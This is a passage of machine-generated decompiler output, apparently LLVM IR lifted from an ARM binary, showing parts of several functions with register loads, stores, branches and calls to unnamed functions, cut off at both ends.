  br i1 %v2_172c4, label %dec_label_pc_172d0, label %dec_label_pc_172dc

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172b8
  %v0_172d0 = load i32, i32* @r4, align 4
  store i32 %v0_172d0, i32* @r0, align 4
  %v0_172d4 = call i32 @function_11048()
  br label %dec_label_pc_172ec

dec_label_pc_172dc:                               ; preds = %dec_label_pc_172b8
  %v0_172dc = load i32, i32* @r5, align 4
  %v1_172dc = load i32, i32* @r7, align 4
  %v2_172dc = add i32 %v1_172dc, %v0_172dc
  %v3_172dc = inttoptr i32 %v2_172dc to i32*
  %v4_172dc = load i32, i32* %v3_172dc, align 4
  %v1_172e0 = add i32 %v4_172dc, 1
  store i32 %v1_172e0, i32* %r3.global-to-local, align 4
  %v0_172e4 = load i32, i32* @r4, align 4
  %v2_172e4 = inttoptr i32 %v1_172bc to i32*
  store i32 %v0_172e4, i32* %v2_172e4, align 4
  %v0_172e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_172e8 = load i32, i32* @r5, align 4
  %v2_172e8 = load i32, i32* @r7, align 4
  %v3_172e8 = add i32 %v2_172e8, %v1_172e8
  %v4_172e8 = inttoptr i32 %v3_172e8 to i32*
  store i32 %v0_172e8, i32* %v4_172e8, align 4
  br label %dec_label_pc_172ec

dec_label_pc_172ec:                               ; preds = %dec_label_pc_1726c, %dec_label_pc_1725c, %dec_label_pc_16f48, %dec_label_pc_172ac, %dec_label_pc_1729c, %dec_label_pc_17288, %dec_label_pc_172d0, %dec_label_pc_172dc
  store i32 12308, i32* %r3.global-to-local, align 4
  %v4_172f0 = load i32, i32* @global_var_25e88.684, align 4
  %v2_172f4 = icmp eq i32 %v4_172f0, 0
  br i1 %v2_172f4, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_172ec
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_172ec, %bb72
  %v2_172fc = xor i1 %v2_172f4, true
  call void @__pseudo_cond_branch(i1 %v2_172fc, i32 %v4_172f0)
  store i32 %v3_16ef8, i32* %r4.global-to-local, align 4
  store i32 %v15_16ef8, i32* @r8, align 4
  store i32 %v18_16ef8, i32* @sb, align 4
  store i32 %v21_16ef8, i32* @sl, align 4
  store i32 %v24_16ef8, i32* @fp, align 4
  ret i32 %v4_172f0

dec_label_pc_17354:                               ; preds = %dec_label_pc_16f18
  store i32 %.v1_16f2c, i32* %v3_16f38, align 4
  %v3_17354 = load i32, i32* @r4, align 4
  store i32 12316, i32* %r4.global-to-local, align 4
  store i32 142964, i32* @r5, align 4
  %v4_17368 = load i32, i32* @global_var_25e90.674, align 4
  store i32 ptrtoint (i32* @global_var_1ae1c.708 to i32), i32* %r3.global-to-local, align 4
  store i32 95100, i32* @lr, align 4
  %v1_17378 = icmp ne i32 %v4_17368, ptrtoint (i32* @global_var_1ae1c.708 to i32)
  call void @__pseudo_cond_branch(i1 %v1_17378, i32 ptrtoint (i32* @global_var_11048.271 to i32))
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 12324, i32* @r7, align 4
  store i32 12312, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1738c = load i32, i32* @r5, align 4
  %v3_1738c = add i32 %v1_1738c, 12320
  %v4_1738c = inttoptr i32 %v3_1738c to i32*
  store i32 0, i32* %v4_1738c, align 4
  %v0_17390 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17390, i32* @global_var_25e90.674, align 4
  br label %dec_label_pc_173a8

dec_label_pc_17398:                               ; preds = %dec_label_pc_173a8
  store i32 %v4_173bc, i32* %r3.global-to-local, align 4
  store i32 %v1_173b0, i32* %v3_173a8, align 4
  %v0_173a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_173a0 = load i32, i32* %r2.global-to-local, align 4
  %v4_173a0 = mul i32 %v1_173a0, 4
  %v5_173a0 = add i32 %v4_173a0, %v0_173a0
  %v6_173a0 = inttoptr i32 %v5_173a0 to i32*
  %v7_173a0 = load i32, i32* %v6_173a0, align 4
  store i32 %v7_173a0, i32* @r0, align 4
  %v0_173a4 = call i32 @function_11048()
  br label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %dec_label_pc_17354, %dec_label_pc_17398
  %v0_173a8 = load i32, i32* @r5, align 4
  %v1_173a8 = load i32, i32* @r7, align 4
  %v2_173a8 = add i32 %v1_173a8, %v0_173a8
  %v3_173a8 = inttoptr i32 %v2_173a8 to i32*
  %v4_173a8 = load i32, i32* %v3_173a8, align 4
  store i32 %v4_173a8, i32* @r4, align 4
  %v2_173ac = icmp eq i32 %v4_173a8, 0
  %v1_173b0 = add i32 %v4_173a8, -1
  store i32 %v1_173b0, i32* %r2.global-to-local, align 4
  %v0_173b4 = load i32, i32* @r6, align 4
  store i32 %v0_173b4, i32* %r3.global-to-local, align 4
  %v4_173bc = load i32, i32* @global_var_25e8c.670, align 4
  br i1 %v2_173ac, label %dec_label_pc_173bc, label %dec_label_pc_17398

dec_label_pc_173bc:                               ; preds = %dec_label_pc_173a8
  store i32 %v4_173bc, i32* @r0, align 4
  %v0_173c0 = call i32 @function_11048()
  %v0_173c4 = load i32, i32* @r4, align 4
  store i32 %v0_173c4, i32* @global_var_25e8c.670, align 4
  store i32 %v3_17354, i32* %r4.global-to-local, align 4
  ret i32 %v0_173c0

; uselistorder directives
  uselistorder i32 %v1_173b0, { 1, 0 }
  uselistorder i32* %v3_173a8, { 1, 0 }
  uselistorder i32 %v1_172bc, { 1, 0, 2 }
  uselistorder i32 %v2_1726c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16ffc, { 1, 0 }
  uselistorder i32 %v2_16fe4, { 1, 0 }
  uselistorder i32 %v2_171ec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1714c, { 1, 0, 2 }
  uselistorder i32 %v1_170c423, { 1, 0 }
  uselistorder i32 %v1_170bc16, { 1, 0 }
  uselistorder i32 %v0_170bc15, { 1, 0 }
  uselistorder i32 %v1_170c4, { 1, 0 }
  uselistorder i32 %v4_17050, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v3_17040, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-560, { 1, 0 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 24, 31, 15, 16, 17, 30, 20, 18, 19, 21, 22, 23, 25, 26, 27, 28, 29 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 0, 8, 20, 9, 19, 16, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 17, 0, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32 ptrtoint (i32* @global_var_1ae1c.708 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_10110, { 12, 11, 6, 5, 13, 14, 20, 10, 9, 8, 3, 7, 0, 1, 17, 19, 18, 16, 15, 2, 4 }
  uselistorder i32 (i16*)* @function_d108, { 6, 5, 3, 4, 0, 1, 2, 7, 8 }
  uselistorder i32 12324, { 2, 1, 4, 3, 0 }
  uselistorder i32 (i32)* @function_119f4, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 1, 4, 3, 5, 2, 0 }
  uselistorder i32 (i32)* @function_fb80, { 2, 1, 0, 4, 3 }
  uselistorder i32 12312, { 2, 5, 3, 4, 0, 1, 6 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1adf8.703 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1adf0.701 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ed48, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 (i32*, i32)* @function_10a30, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_25e90.674, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 12316, { 0, 2, 1 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_f5d0, { 10, 11, 12, 0, 13, 9, 8, 14, 19, 6, 7, 26, 25, 22, 20, 1, 16, 17, 18, 2, 3, 4, 5, 15, 21, 23, 24 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_1ade4.699 to i32), { 1, 0 }
  uselistorder i32 ()* @function_16e4c, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_d2bc, { 2, 3, 6, 5, 4, 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1a714.599 to i32), { 0, 2, 1, 3 }
  uselistorder i32 935, { 0, 3, 4, 2, 1 }
  uselistorder i32 12320, { 0, 5, 2, 7, 3, 8, 1, 6, 4, 9, 10, 12, 11, 13 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_1add0.686 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_173a8, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_172ec, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1725c, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_17210, { 1, 0 }
  uselistorder label %dec_label_pc_17208, { 1, 0 }
  uselistorder label %dec_label_pc_170cc, { 1, 0 }
  uselistorder label %dec_label_pc_171ec.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
}

define i32 @function_173ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_173ec:
  %v0_173ec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_17428 = call i32 @function_17b50()
  store i32 %v0_173ec, i32* @lr, align 4
  ret i32 %v0_17428
}

define i32 @function_17438() local_unnamed_addr {
dec_label_pc_17438:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_17440 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1744c = load i32, i32* @r0, align 4
  store i32 %v0_1744c, i32* @sl, align 4
  %v2_1744c = icmp eq i32 %v0_1744c, 0
  %v2_17450 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_17450, align 4
  %v0_17454 = load i32, i32* @r1, align 4
  store i32 %v0_17454, i32* @r7, align 4
  %v0_17458 = load i32, i32* @r3, align 4
  store i32 %v0_17458, i32* @r6, align 4
  br i1 %v2_1744c, label %bb, label %dec_label_pc_17464

bb:                                               ; preds = %dec_label_pc_17438
  %v1_1745c = load i32, i32* @r5, align 4
  %v2_1745c = add i32 %v1_1745c, 22
  store i32 %v2_1745c, i32* @r5, align 4
  br label %dec_label_pc_17720

dec_label_pc_17464:                               ; preds = %dec_label_pc_17438
  %v0_17464 = call i32 @function_d0ec()
  store i32 %v0_17464, i32* %r0.global-to-local, align 4
  %v3_17468 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_17468, i32* %ip.global-to-local, align 4
  %v1_1746c = inttoptr i32 %v0_17464 to i32*
  %v2_1746c = load i32, i32* %v1_1746c, align 4
  store i32 %v2_1746c, i32* @r8, align 4
  %v0_17470 = load i32, i32* @r5, align 4
  store i32 %v0_17470, i32* %v1_1746c, align 4
  %v0_17474 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_17464, i32* @r4, align 4
  %v0_17484 = load i32, i32* @sl, align 4
  store i32 %v0_17484, i32* %r0.global-to-local, align 4
  %v0_17488 = load i32, i32* @r7, align 4
  store i32 %v0_17488, i32* %r2.global-to-local, align 4
  store i32 %v0_17440, i32* %r3.global-to-local, align 4
  %v0_17490 = load i32, i32* @r6, align 4
  %v7_17498 = call i32 @function_173ec(i32 %v0_17484, i32 2, i32 %v0_17488, i32 %v0_17440, i32 %v0_17490, i32 %v0_17474, i32 %tmp18)
  store i32 %v7_17498, i32* %r0.global-to-local, align 4
  store i32 %v7_17498, i32* @r5, align 4
  %v2_1749c = icmp eq i32 %v7_17498, 0
  br i1 %v2_1749c, label %bb34, label %dec_label_pc_174a8

bb34:                                             ; preds = %dec_label_pc_17464
  %v1_174a0 = load i32, i32* @r8, align 4
  %v2_174a0 = load i32, i32* @r4, align 4
  %v3_174a0 = inttoptr i32 %v2_174a0 to i32*
  store i32 %v1_174a0, i32* %v3_174a0, align 4
  br label %dec_label_pc_17720

dec_label_pc_174a8:                               ; preds = %dec_label_pc_17464
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_174ac = inttoptr i32 %tmp18 to i32*
  %v2_174ac = load i32, i32* %v1_174ac, align 4
  store i32 %v2_174ac, i32* %r3.global-to-local, align 4
  %v7_174b0 = icmp eq i32 %v2_174ac, 1
  br i1 %v7_174b0, label %dec_label_pc_174cc, label %dec_label_pc_174b8

dec_label_pc_174b8:                               ; preds = %dec_label_pc_174a8
  %v7_174b8 = icmp eq i32 %v2_174ac, 4
  br i1 %v7_174b8, label %dec_label_pc_174ec, label %dec_label_pc_174c0

dec_label_pc_174c0:                               ; preds = %dec_label_pc_174b8
  %v3_174c0 = icmp eq i32 %v2_174ac, -1
  br i1 %v3_174c0, label %dec_label_pc_174e0, label %dec_label_pc_17720

dec_label_pc_174cc:                               ; preds = %dec_label_pc_174a8
  %v7_174cc = icmp eq i32 %v7_17498, 2
  br i1 %v7_174cc, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_174cc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_174f4

.thread4:                                         ; preds = %dec_label_pc_174cc
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_174f4

dec_label_pc_174e0:                               ; preds = %dec_label_pc_174c0
  %v0_174e0 = load i32, i32* @r4, align 4
  %v1_174e0 = inttoptr i32 %v0_174e0 to i32*
  %v2_174e0 = load i32, i32* %v1_174e0, align 4
  store i32 %v2_174e0, i32* %r3.global-to-local, align 4
  %v7_174e4 = icmp eq i32 %v2_174e0, 2
  br i1 %v7_174e4, label %dec_label_pc_174ec, label %dec_label_pc_17720

dec_label_pc_174ec:                               ; preds = %dec_label_pc_174e0, %dec_label_pc_174b8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_174f4

dec_label_pc_174f4:                               ; preds = %.thread4, %bb35, %dec_label_pc_174ec
  %storemerge2 = phi i32 [ 0, %dec_label_pc_174ec ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_174fc = load i32, i32* @r8, align 4
  %v1_174fc = load i32, i32* @r4, align 4
  %v2_174fc = inttoptr i32 %v1_174fc to i32*
  store i32 %v0_174fc, i32* %v2_174fc, align 4
  %v0_17500 = load i32, i32* @sl, align 4
  store i32 %v0_17500, i32* @r0, align 4
  %v0_17504 = load i32, i32* %r3.global-to-local, align 4
  %v1_17504 = load i32, i32* @ip, align 4
  %v2_17504 = inttoptr i32 %v1_17504 to i32*
  store i32 %v0_17504, i32* %v2_17504, align 4
  %v0_17508 = call i32 @function_f670()
  store i32 %v0_17508, i32* %r0.global-to-local, align 4
  %v1_1750c = add i32 %v0_17508, 1
  store i32 %v1_1750c, i32* @r4, align 4
  %v0_17510 = load i32, i32* @r6, align 4
  %v7_17514 = icmp sgt i32 %v0_17510, %v1_1750c
  br i1 %v7_17514, label %dec_label_pc_17518, label %dec_label_pc_1771c

dec_label_pc_17518:                               ; preds = %dec_label_pc_174f4
  %v0_17518 = load i32, i32* @sl, align 4
  store i32 %v0_17518, i32* @r1, align 4
  store i32 %v1_1750c, i32* @r2, align 4
  store i32 %v0_17440, i32* @r0, align 4
  %v0_17524 = call i32 @function_f700()
  store i32 %v0_17524, i32* %r0.global-to-local, align 4
  %v1_1752c = load i32, i32* @r4, align 4
  %v2_1752c = add i32 %v1_1752c, %v0_17440
  %v1_17530 = sub i32 0, %v2_1752c
  %v1_17534 = load i32, i32* @r6, align 4
  %v2_17534 = sub i32 %v1_17534, %v1_1752c
  store i32 %v2_17534, i32* %r2.global-to-local, align 4
  %v1_17538 = urem i32 %v1_17530, 4
  store i32 %v1_17538, i32* %r3.global-to-local, align 4
  %v2_1753c = sub i32 %v2_17534, %v1_17538
  store i32 %v2_1753c, i32* @sb, align 4
  %v1_17540 = add i32 %v2_1753c, -8
  store i32 %v1_17540, i32* @r5, align 4
  %v7_17548 = icmp slt i32 %v1_17540, 256
  br i1 %v7_17548, label %dec_label_pc_1771c, label %dec_label_pc_1754c

dec_label_pc_1754c:                               ; preds = %dec_label_pc_17518
  %v2_1754c = add i32 %v1_17538, %v2_1752c
  store i32 %v2_1754c, i32* @fp, align 4
  store i32 %v0_17440, i32* %ip.global-to-local, align 4
  %v1_17554 = add i32 %v2_1754c, 8
  store i32 %v1_17554, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1755c = add i32 %v2_1754c, 16
  store i32 %v1_1755c, i32* @r8, align 4
  %v4_17560 = inttoptr i32 %v2_1754c to i32*
  store i32 %v0_17440, i32* %v4_17560, align 4
  %v0_17564 = load i32, i32* @sl, align 4
  store i32 %v0_17564, i32* %r0.global-to-local, align 4
  %v0_17568 = load i32, i32* @r4, align 4
  %v1_17568 = load i32, i32* @fp, align 4
  %v2_17568 = add i32 %v1_17568, 4
  %v3_17568 = inttoptr i32 %v2_17568 to i32*
  store i32 %v0_17568, i32* %v3_17568, align 4
  %v0_1756c = load i32, i32* @r8, align 4
  %v2_17570 = inttoptr i32 %v0_17564 to i8*
  %v3_17570 = call i32 @function_151a8(i8* %v2_17570, i32 %v0_1756c)
  store i32 %v3_17570, i32* %r0.global-to-local, align 4
  %v1_17574 = load i32, i32* @r4, align 4
  %v9_17574 = icmp eq i32 %v3_17570, %v1_17574
  br i1 %v9_17574, label %dec_label_pc_175b8, label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_1754c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_17580 = load i32, i32* @r7, align 4
  %v2_17580 = add i32 %v1_17580, 8
  %v3_17580 = inttoptr i32 %v2_17580 to i32*
  store i32 2, i32* %v3_17580, align 4
  %v0_17584 = load i32, i32* %r3.global-to-local, align 4
  %v2_17584 = mul i32 %v0_17584, 2
  %v1_17588 = load i32, i32* @r7, align 4
  %v2_17588 = add i32 %v1_17588, 12
  %v3_17588 = inttoptr i32 %v2_17588 to i32*
  store i32 %v2_17584, i32* %v3_17588, align 4
  %v3_1758c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1758c, i32* %r2.global-to-local, align 4
  store i32 %v0_17440, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_17598 = load i32, i32* @r4, align 4
  store i32 %v0_17598, i32* @r5, align 4
  %v0_1759c = load i32, i32* @r8, align 4
  %v1_1759c = load i32, i32* @fp, align 4
  %v2_1759c = add i32 %v1_1759c, 8
  %v3_1759c = inttoptr i32 %v2_1759c to i32*
  store i32 %v0_1759c, i32* %v3_1759c, align 4
  %v0_175a0 = load i32, i32* @r7, align 4
  %v1_175a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_175a0 = inttoptr i32 %v1_175a0 to i32*
  store i32 %v0_175a0, i32* %v2_175a0, align 4
  %v0_175a4 = load i32, i32* @r7, align 4
  %v1_175a4 = inttoptr i32 %v0_175a4 to i32*
  %v2_175a4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_175a4, i32* %v1_175a4, align 4
  %v3_175a4 = add i32 %v0_175a4, 4
  %v4_175a4 = inttoptr i32 %v3_175a4 to i32*
  %v5_175a4 = load i32, i32* @fp, align 4
  store i32 %v5_175a4, i32* %v4_175a4, align 4
  %v0_175a8 = load i32, i32* @r6, align 4
  %v1_175a8 = load i32, i32* @r7, align 4
  %v2_175a8 = add i32 %v1_175a8, 16
  %v3_175a8 = inttoptr i32 %v2_175a8 to i32*
  store i32 %v0_175a8, i32* %v3_175a8, align 4
  %v0_175ac = load i32, i32* @r4, align 4
  %v1_175ac = load i32, i32* @ip, align 4
  %v2_175ac = inttoptr i32 %v1_175ac to i32*
  store i32 %v0_175ac, i32* %v2_175ac, align 4
  %v0_175b0 = load i32, i32* @r4, align 4
  %v1_175b0 = load i32, i32* @r6, align 4
  %v2_175b0 = add i32 %v1_175b0, 4
  %v3_175b0 = inttoptr i32 %v2_175b0 to i32*
  store i32 %v0_175b0, i32* %v3_175b0, align 4
  br label %dec_label_pc_17720

dec_label_pc_175b8:                               ; preds = %dec_label_pc_1754c
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_175bc = icmp eq i32 %storemerge2, 0
  br i1 %v2_175bc, label %dec_label_pc_175d4, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_175b8
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_174ac, align 4
  br label %dec_label_pc_17720

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175b8
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_175e0 = load i32, i32* @sl, align 4
  store i32 %v0_175e0, i32* %r0.global-to-local, align 4
  %v2_175e8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_175e8, i32* %r2.global-to-local, align 4
  %v2_175ec = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_175ec, i32* %r3.global-to-local, align 4
  %v7_175f8 = inttoptr i32 %v0_175e0 to i8*
  %v8_175f8 = call i32 @function_16664(i8* %v7_175f8, i32 1, i32 %v2_175e8, i32 %v2_175ec)
  store i32 %v8_175f8, i32* %r0.global-to-local, align 4
  %v1_175fc = icmp slt i32 %v8_175f8, 0
  br i1 %v1_175fc, label %.thread, label %dec_label_pc_17614

.thread:                                          ; preds = %dec_label_pc_175d4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_174ac, align 4
  br label %dec_label_pc_17720

dec_label_pc_17614:                               ; preds = %dec_label_pc_175d4
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_17618 = icmp eq i32 %tmp12, 1
  br i1 %v7_17618, label %dec_label_pc_17620, label %dec_label_pc_176f8

dec_label_pc_17620:                               ; preds = %dec_label_pc_17614
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_17638 = load i32, i32* @r5, align 4
  %v2_17638 = add i32 %v0_17638, -12
  store i32 %v2_17638, i32* @r8, align 4
  %v8_17638 = icmp slt i32 %v2_17638, 0
  br i1 %v8_17638, label %bb37, label %dec_label_pc_17644

bb37:                                             ; preds = %dec_label_pc_17620
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_17708

dec_label_pc_17644:                               ; preds = %dec_label_pc_17620
  %v0_17644 = load i32, i32* @r6, align 4
  store i32 %v0_17644, i32* @r1, align 4
  %v2_17648 = add i32 %v0_17644, 12
  store i32 %v2_17648, i32* @r0, align 4
  %v2_1764c = call i32 @function_17910(i32 %v2_17648, i32 %v0_17644)
  %v0_17650 = load i32, i32* @fp, align 4
  %v1_17650 = add i32 %v0_17650, 4
  store i32 %v1_17650, i32* @r3, align 4
  %v1_17654 = load i32, i32* @r4, align 4
  %v2_17654 = add i32 %v1_17654, %v1_17650
  store i32 %v2_17654, i32* @r5, align 4
  store i32 %v2_17654, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_17664 = call i32 @function_f700()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17670.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_17670, %dec_label_pc_17644
  %v0_17670 = phi i32 [ %v0_17670.pre, %dec_label_pc_17644 ], [ %v1_17674, %dec_label_pc_17670 ]
  %v1_17670 = load i32, i32* @r6, align 4
  %v7_17670 = inttoptr i32 %v1_17670 to i32*
  store i32 %v0_17670, i32* %v7_17670, align 4
  %v0_17674 = load i32, i32* @r5, align 4
  %v1_17674 = add i32 %v0_17674, 4
  store i32 %v1_17674, i32* @r5, align 4
  %v0_17678 = load i32, i32* %r0.global-to-local, align 4
  %v1_17678 = add i32 %v0_17678, 1
  store i32 %v1_17678, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_17678, 0
  br i1 %tmp38, label %dec_label_pc_17670, label %dec_label_pc_17688

dec_label_pc_17688:                               ; preds = %dec_label_pc_17670
  %v3_17688 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_17688, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17690 = icmp eq i32 %v3_17688, 0
  %v1_17694 = load i32, i32* @r6, align 4
  %v5_17694 = mul i32 %v1_17678, 4
  %v6_17694 = add i32 %v1_17694, %v5_17694
  %v7_17694 = inttoptr i32 %v6_17694 to i32*
  store i32 0, i32* %v7_17694, align 4
  br i1 %v2_17690, label %dec_label_pc_176c4, label %dec_label_pc_1769c

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17688
  %v0_1769c = load i32, i32* @r4, align 4
  store i32 %v0_1769c, i32* @r0, align 4
  %v0_176a0 = call i32 @function_f670()
  store i32 %v0_176a0, i32* %r0.global-to-local, align 4
  %v0_176a4 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_176a4, %v0_176a0
  br i1 %tmp, label %dec_label_pc_176ac, label %dec_label_pc_176c4

dec_label_pc_176ac:                               ; preds = %dec_label_pc_1769c
  %v0_176ac = load i32, i32* @r4, align 4
  store i32 %v0_176ac, i32* @r1, align 4
  %v0_176b0 = load i32, i32* @r5, align 4
  store i32 %v0_176b0, i32* %r0.global-to-local, align 4
  %v2_176b4 = inttoptr i32 %v0_176b0 to i8*
  %v3_176b4 = call i32 @function_f8ec(i8* %v2_176b4, i32 %v0_176ac)
  store i32 %v3_176b4, i32* %r0.global-to-local, align 4
  %v0_176b8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_176c4

dec_label_pc_176c4:                               ; preds = %dec_label_pc_1769c, %dec_label_pc_17688, %dec_label_pc_176ac
  %storemerge1 = phi i32 [ %v0_176b8, %dec_label_pc_176ac ], [ %v0_17440, %dec_label_pc_1769c ], [ %v0_17440, %dec_label_pc_17688 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_176c8 = load i32, i32* @r7, align 4
  %v2_176c8 = add i32 %v1_176c8, 8
  %v3_176c8 = inttoptr i32 %v2_176c8 to i32*
  store i32 2, i32* %v3_176c8, align 4
  %v0_176cc = load i32, i32* %r2.global-to-local, align 4
  %v2_176cc = mul i32 %v0_176cc, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_176d4 = load i32, i32* @r7, align 4
  %v2_176d4 = add i32 %v1_176d4, 12
  %v3_176d4 = inttoptr i32 %v2_176d4 to i32*
  store i32 %v2_176cc, i32* %v3_176d4, align 4
  %v3_176d8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_176d8, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_176e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_176e0, i32* @r5, align 4
  %v0_176e4 = load i32, i32* @r7, align 4
  %v2_176e4 = inttoptr i32 %v3_176d8 to i32*
  store i32 %v0_176e4, i32* %v2_176e4, align 4
  %v0_176e8 = load i32, i32* @r7, align 4
  %v1_176e8 = inttoptr i32 %v0_176e8 to i32*
  %v2_176e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_176e8, i32* %v1_176e8, align 4
  %v3_176e8 = add i32 %v0_176e8, 4
  %v4_176e8 = inttoptr i32 %v3_176e8 to i32*
  %v5_176e8 = load i32, i32* @fp, align 4
  store i32 %v5_176e8, i32* %v4_176e8, align 4
  %v0_176ec = load i32, i32* @r6, align 4
  %v1_176ec = load i32, i32* @r7, align 4
  %v2_176ec = add i32 %v1_176ec, 16
  %v3_176ec = inttoptr i32 %v2_176ec to i32*
  store i32 %v0_176ec, i32* %v3_176ec, align 4
  %v0_176f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_176f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_176f0 = inttoptr i32 %v1_176f0 to i32*
  store i32 %v0_176f0, i32* %v2_176f0, align 4
  br label %dec_label_pc_17708

dec_label_pc_176f8:                               ; preds = %dec_label_pc_17614
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_174ac, align 4
